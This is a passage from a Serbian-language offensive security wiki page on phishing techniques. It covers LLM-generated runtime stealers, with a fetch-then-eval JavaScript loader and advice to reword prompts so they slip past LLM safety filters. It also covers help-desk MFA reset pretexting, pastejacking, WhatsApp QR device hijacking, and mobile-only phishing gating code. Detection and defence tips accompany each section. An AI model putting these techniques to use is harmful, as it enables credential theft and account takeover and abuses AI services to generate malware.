Napadači mogu da isporuče HTML koji izgleda bezazleno i **generišu stealer tokom izvršavanja** tako što zatraže JavaScript od **pouzdanog LLM API-ja**, a zatim ga izvrše u pregledaču (npr. pomoću `eval` ili dinamičkog `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt kao tehnika zaobilaženja:** enkodirajte URL-ove za eksfiltraciju/Base64 nizove u promptu; menjajte formulaciju da biste zaobišli bezbednosne filtere i smanjili halucinacije.
2. **API poziv sa strane klijenta:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/itd.) ili CDN proxy; u statičkom HTML-u prisutan je samo prompt/API poziv.
3. **Sklapanje i izvršavanje:** konkatenirajte odgovor i izvršite ga (polimorfno pri svakoj poseti):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** generisani kod personalizuje mamac (npr. parsiranje LogoKit tokena) i šalje kredencijale na endpoint sakriven u promptu.

**Osobine izbegavanja detekcije**
- Saobraćaj ide ka poznatim LLM domenima ili pouzdanim CDN proxy-jima; ponekad preko WebSockets veze sa backendom.
- Nema statičkog payload-a; zlonamerni JS postoji tek nakon renderovanja.
- Nedeterminističke generacije stvaraju **jedinstvene** stealere za svaku sesiju.

**Ideje za detekciju**
- Pokrećite sandbox okruženja sa omogućenim JS-om; označite **`eval` tokom izvršavanja / dinamičko kreiranje skripti iz LLM odgovora**.
- Tražite front-end POST zahteve ka LLM API-jima, po kojima odmah slede `eval`/`Function` nad vraćenim tekstom.
- Generišite upozorenje za neodobrene LLM domene u saobraćaju klijenta, a zatim i za naknadne POST zahteve sa kredencijalima.

---

## MFA Fatigue / Push Bombing varijanta – prinudno resetovanje
Pored klasičnog push-bombing-a, operater jednostavno **prisilno pokreće novu MFA registraciju** tokom poziva help desku, čime poništava postojeći token korisnika. Svaki naredni zahtev za prijavu žrtvi deluje legitimno.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Pratite AzureAD/AWS/Okta događaje u kojima se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu neprimetno da kopiraju zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted veb-stranice, a zatim prevare korisnika da ih nalepi u **Win + R**, **Win + X** ili prozor terminala, čime se izvršava proizvoljan kod bez preuzimanja ili priloga.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobilni phishing i distribucija zlonamernih aplikacija (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Otimanje povezivanja WhatsApp uređaja putem QR koda i social engineering-a
* Stranica-mamac (npr. lažni „kanal” ministarstva/CERT-a) prikazuje QR kod za WhatsApp Web/Desktop i upućuje žrtvu da ga skenira, čime se napadač neprimetno dodaje kao **povezani uređaj**.<sup>[[12]](#references)</sup>
* Napadač odmah dobija uvid u četove/kontakte sve dok se sesija ne ukloni. Žrtve mogu kasnije da vide obaveštenje „povezan je novi uređaj”; branioci mogu da traže neočekivane događaje povezivanja uređaja ubrzo nakon poseta nepouzdanim QR stranicama.

### Mobilni phishing radi izbegavanja crawler-a/sandbox-a
Operateri sve češće ograničavaju svoje phishing tokove jednostavnom proverom uređaja, tako da desktop crawler-i nikada ne stignu do završnih stranica. Uobičajen obrazac je mala skripta koja proverava da li DOM podržava dodir i šalje rezultat na krajnju tačku servera; klijenti koji nisu mobilni dobijaju HTTP 500 (ili praznu stranicu), dok se mobilnim korisnicima prikazuje ceo tok.<sup>[[7]](#references)</sup>

Minimalni isečak koda na klijentu (tipična logika):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` logika (pojednostavljeno):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Ponašanje servera koje se često uočava:
- Postavlja session cookie tokom prvog učitavanja.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) za naredne GET zahteve kada je `is_mobile=false`; phishing sadržaj prikazuje samo ako je `true`.

Heuristike za lov i detekciju:
- Upit za urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetrija weba: niz `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za uređaje koji nisu mobilni; legitimne putanje za mobilne žrtve vraćaju 200 i prateći HTML/JS.
- Blokirajte ili pažljivo proveravajte stranice koje uslovljavaju sadržaj isključivo na osnovu `ontouchstart` ili sličnih provera uređaja.

Saveti za odbranu:
- Pokrećite crawlers sa fingerprintovima nalik mobilnim uređajima i omogućenim JS-om da biste otkrili sadržaj iza provera.
- Generišite upozorenje na sumnjive odgovore 500 nakon `POST /detect` na domenima koji su nedavno registrovani.

## References

- [1] [Generisanje varijacija domena koje se koriste u phishing napadima (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Pronalaženje phishing stranica: alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Krađa akreditiva i zaobilaženje 2FA pomoću noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Krađa sesija i zaobilaženje 2FA pomoću EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Kako instalirati i konfigurisati DKIM pomoću Postfix-a na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Izveštaj Unit 42 o globalnom reagovanju na incidente za 2025. – izdanje o socijalnom inženjeringu](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Tihi smishing – mobilna phishing infrastruktura i heuristike (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Sledeća granica napada sklapanjem u toku izvršavanja: korišćenje LLM-ova za generisanje phishing JavaScript-a u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Lažno predstavljanje, otimanje klikova i TDS: uvid u ekosistem distribucije malvera](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Otimanje saobraćaja ka Microsoft-ovom windows.com pomoću preokretanja bitova (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Ljubav? Zapravo: lažna aplikacija za upoznavanje iskorišćena kao mamac u ciljanoj kampanji špijunskog softvera u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC-ovi i uzorci](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
